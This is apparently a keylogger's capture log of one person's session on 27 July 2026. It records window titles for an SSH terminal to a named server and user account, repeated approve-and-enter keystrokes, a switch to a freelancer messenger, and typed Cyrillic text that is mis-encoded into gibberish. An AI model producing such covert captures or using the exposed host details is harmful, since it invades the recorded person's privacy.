+--- WINDOW  2026.07.27 11:40:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  8B
+
+--- WINDOW  2026.07.27 11:40:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  C9
+
+--- WINDOW  2026.07.27 11:40:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   : G> [v][ENTER]
+
+--- WINDOW  2026.07.27 11:40:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:50  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:51  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  . 
+
+--- WINDOW  2026.07.27 11:40:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Bk][Bk][Bk]
+
+--- WINDOW  2026.07.27 11:40:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  . @57C;LB0B <0T 1CB8 ?@83>;><H8289
+
+--- WINDOW  2026.07.27 11:41:03  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [ENTER]
+
+--- WINDOW  2026.07.27 11:41:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:06  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:09  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:10  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:15  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:29  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:31  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:32  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:34  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:35  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:35  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:37  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:38  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:39  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:40  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:44  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:41:51  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:41:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  @
+
+--- WINDOW  2026.07.27 11:41:53  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  >B>?
+
+--- WINDOW  2026.07.27 11:41:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   <
+
+--- WINDOW  2026.07.27 11:41:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  83
+
+--- WINDOW  2026.07.27 11:41:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  ;O40B8
+
+--- WINDOW  2026.07.27 11:41:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   O
+
+--- WINDOW  2026.07.27 11:41:58  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  : A
+
+--- WINDOW  2026.07.27 11:41:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  ?@02
+
+--- WINDOW  2026.07.27 11:42:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  6=V
+
+--- WINDOW  2026.07.27 11:42:01  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  9 0:
+
+--- WINDOW  2026.07.27 11:42:02  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  H[Bk]
+
+--- WINDOW  2026.07.27 11:42:03  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Bk][Bk][Bk]
+
+--- WINDOW  2026.07.27 11:42:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  A09
+
+--- WINDOW  2026.07.27 11:42:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  B.
+
+--- WINDOW  2026.07.27 11:42:06  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   =5 70
+
+--- WINDOW  2026.07.27 11:42:07  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  1C2
+
+--- WINDOW  2026.07.27 11:42:08  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  09
+
+--- WINDOW  2026.07.27 11:42:09  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   ?@> F
+
+--- WINDOW  2026.07.27 11:42:10  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  5
+
+--- WINDOW  2026.07.27 11:42:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [ENTER]
+
+--- WINDOW  2026.07.27 11:42:12  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:13  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:15  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:19  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:20  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:42:28  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:29  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:31  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:32  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:33  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:34  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:35  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:37  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:38  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:39  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:40  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:44  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:48  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:50  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:51  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:51  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:53  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:55  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:58  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:42:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:01  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:02  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:06  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:07  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:08  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:09  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:10  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:12  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:13  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:43:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:47:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:19  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:20  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:27  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:28  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:28  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:47:28  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:47:29  [chrome.exe] (17) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:43  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:48:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:48  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:50  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:51  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:52  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:53  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:55  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
